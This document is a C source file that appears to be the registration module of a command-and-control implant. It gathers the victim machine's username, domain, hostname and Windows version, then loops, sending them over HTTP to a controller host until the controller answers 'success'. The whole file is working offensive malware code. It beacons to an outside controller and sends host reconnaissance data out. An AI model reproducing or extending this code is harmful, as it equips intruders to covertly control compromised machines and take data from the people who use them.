#include "pch.h"
#include "api.h"
#include "jsmn.h"
#include "beacon.h"
#include "transport.h"

API g_Api;
PROFILE g_Profile;
PCHAR g_lpId = NULL;
PWCHAR g_lpwId = NULL;
extern HMODULE g_hModule;

BOOL BeaconRegister()
{
    jsmn_parser p;
    jsmntok_t t[100];
    CHAR lpcVersion[256];
    CHAR lpcUserName[256];
    CHAR lpcDomainName[256];
    CHAR lpcComputerName[256];
    OSVERSIONINFOEXW OsInfomation;

	OsInfomation.dwOSVersionInfoSize = sizeof(OsInfomation);

    if (!GetBasicUserInfo( &lpcUserName, &lpcDomainName, &lpcComputerName ))
    {
        strcpy(lpcUserName, " ");
        strcpy(lpcDomainName, " ");
        strcpy(lpcComputerName, " ");
    }

    g_Api.RtlGetVersion(
        &OsInfomation
    );

    if ((OsInfomation.dwMajorVersion == 10) && (OsInfomation.wProductType == VER_NT_WORKSTATION))
    {
        strcpy(
            lpcVersion,
            "Windows 10"
        );
    }

    else if ((OsInfomation.dwMajorVersion == 10) && (OsInfomation.wProductType != VER_NT_WORKSTATION))
    {
        strcpy(
            lpcVersion,
            "Windows Server 2016"
        );
    }

    else if ((OsInfomation.dwMajorVersion == 6) && (OsInfomation.dwMinorVersion == 3) && (OsInfomation.wProductType == VER_NT_WORKSTATION))
    {
        strcpy(
            lpcVersion,
            "Windows 8.1"
        );
    }

    else if ((OsInfomation.dwMajorVersion == 6) && (OsInfomation.dwMinorVersion == 3) && (OsInfomation.wProductType != VER_NT_WORKSTATION))
    {
        strcpy(
            lpcVersion,
            "Windows Server 2012 R2"
        );
    }

    else if ((OsInfomation.dwMajorVersion == 6) && (OsInfomation.dwMinorVersion == 2) && (OsInfomation.wProductType == VER_NT_WORKSTATION))
    {
        strcpy(
            lpcVersion,
            "Windows 8"
        );
    }

    else if ((OsInfomation.dwMajorVersion == 6) && (OsInfomation.dwMinorVersion == 2) && (OsInfomation.wProductType != VER_NT_WORKSTATION))
    {
        strcpy(
            lpcVersion,
            "Windows Server 2012"
        );
    }
    else
    {
        strcpy(
            lpcVersion,
            "Windows"
        );
    }

    LPVOID lpReply = HttpCallback(
        g_Profile.lpwHost,
        FALSE,
        C2_REGISTER,
        NULL,
        NULL
    );

    if (lpReply != NULL)
    {
        jsmn_init(&p);

        INT iRet = jsmn_parse(
            &p,
            (PCHAR)lpReply,
            strlen((PCHAR)lpReply),
            t,
            sizeof(t) / sizeof(t[0])
        );

        if (iRet < 0)
        {
            return FALSE;
        }

        // should be the first value, don't bother looping
        if (jsoneq( (PCHAR)lpReply, &t[1], "status") == 0 )
        {
            INT iSize = (t[2].end - t[2].start);

            PCHAR lpStatus = (PCHAR)HeapAlloc(
                GetProcessHeap(),
                HEAP_ZERO_MEMORY,
                iSize
            );

            if (!lpStatus)
            {
                return FALSE;
            }

            sprintf(
                lpStatus,
                "%.*s",
                iSize,
                (PCHAR)lpReply + t[2].start
            );

            // are we speaking to the c2
            if (strcmp(lpStatus, "success") != 0)
            {
                return FALSE;
            }

            HeapFree(
                GetProcessHeap(),
                HEAP_NO_SERIALIZE,
                lpStatus
            );

            PCHAR lpResp = (PCHAR)HeapAlloc(
                GetProcessHeap(),
                HEAP_ZERO_MEMORY,
                10240
            );

            if (!lpResp)
            {
                return FALSE;
            }

            sprintf(
                lpResp,
                "id=%s&username=%s&domain=%s&machine=%s&arch=%s&os=%s&secure=%s&impersonate=%s",
                g_lpId,
                lpcUserName,
                lpcDomainName,
                lpcComputerName,
                "x64",
                lpcVersion,
                "True",
                "None"
            );

            lpReply = HttpCallback(
                g_Profile.lpwHost,
                TRUE,
                C2_REGISTER,
                lpResp,
                strlen(lpResp)
            );

            if (lpReply != NULL)
            {
                jsmn_init(&p);

                INT iRet = jsmn_parse(
                    &p,
                    (PCHAR)lpReply,
                    strlen((PCHAR)lpReply),
                    t,
                    sizeof(t) / sizeof(t[0])
                );

                if (iRet < 0)
                {
                    return FALSE;
                }

                // should be the first value, don't bother looping
                if (jsoneq( (PCHAR)lpReply, &t[1], "status") == 0 )
                {
                    INT iSize = (t[2].end - t[2].start);

                    PCHAR lpStatus = (PCHAR)HeapAlloc(
                        GetProcessHeap(),
                        HEAP_ZERO_MEMORY,
                        iSize
                    );

                    if (!lpStatus)
                    {
                        return FALSE;
                    }

                    sprintf(
                        lpStatus,
                        "%.*s",
                        iSize,
                        (PCHAR)lpReply + t[2].start
                    );

                    // are we speaking to the c2
                    if (strcmp(lpStatus, "success") != 0)
                    {
                        return FALSE;
                    }
                }
            }
        }
    }
    else {
        return FALSE;
    }

    return TRUE;
}

VOID Start()
{
    if (!ResolveImports( &g_Api ))
    {
        return;
    }

    if (!GenerateId())
    {
        return;
    }

    if (!UnpackProfile( &g_Profile ))
    {
        return;
    }

    do
    {
        if (BeaconRegister())
        {
            break;
        }

        BeaconSleep();
    } while (TRUE);

    // MessageBoxA(0, "beacon registed", "beacon", NULL);

    return;
}